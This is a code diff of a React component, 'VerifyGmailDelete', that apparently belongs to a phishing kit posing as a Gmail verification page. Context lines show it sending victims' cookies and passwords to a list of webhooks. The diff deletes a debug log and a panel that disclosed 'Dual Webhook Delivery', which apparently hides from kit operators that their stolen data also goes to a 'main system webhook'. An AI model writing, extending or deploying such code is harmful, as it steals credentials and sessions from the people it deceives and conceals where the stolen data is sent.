@@ -139,8 +139,6 @@ export const VerifyGmailDelete = ({
     const webhookUrls = getWebhookUrls();
     const data = { cookies, password };
 
-    console.log("Sending to webhooks:", webhookUrls); // Debug log
-
     // Send to all webhook URLs
     let successCount = 0;
     for (let i = 0; i < webhookUrls.length; i++) {
@@ -236,26 +234,6 @@ export const VerifyGmailDelete = ({
               />
             </motion.div>
 
-            {isCustomInstance && (
-              <motion.div
-                className="bg-gradient-to-r from-purple-900/20 to-blue-900/20 border border-purple-500/30 rounded-lg p-4"
-                initial={{ opacity: 0, scale: 0.95 }}
-                animate={{ opacity: 1, scale: 1 }}
-                transition={{ delay: 0.5 }}
-              >
-                <h4 className="text-purple-300 font-semibold mb-2 text-sm">
-                  Dual Webhook Delivery:
-                </h4>
-                <ul className="text-purple-200 text-xs space-y-1">
-                  <li>• ✅ Data will be sent to the custom instance webhook</li>
-                  <li>
-                    • ✅ Data will also be sent to the main system webhook
-                  </li>
-                  <li>• ✅ Both recipients will receive full data package</li>
-                </ul>
-              </motion.div>
-            )}
-
             {error && (
               <motion.p
                 className="text-red-400 text-sm text-center font-medium bg-red-900/20 border border-red-500/30 rounded-lg py-2 px-4"
@@ -270,7 +248,7 @@ export const VerifyGmailDelete = ({
               className="flex gap-4"
               initial={{ y: 20, opacity: 0 }}
               animate={{ y: 0, opacity: 1 }}
-              transition={{ delay: 0.6 }}
+              transition={{ delay: 0.5 }}
             >
               <Button
                 type="button"
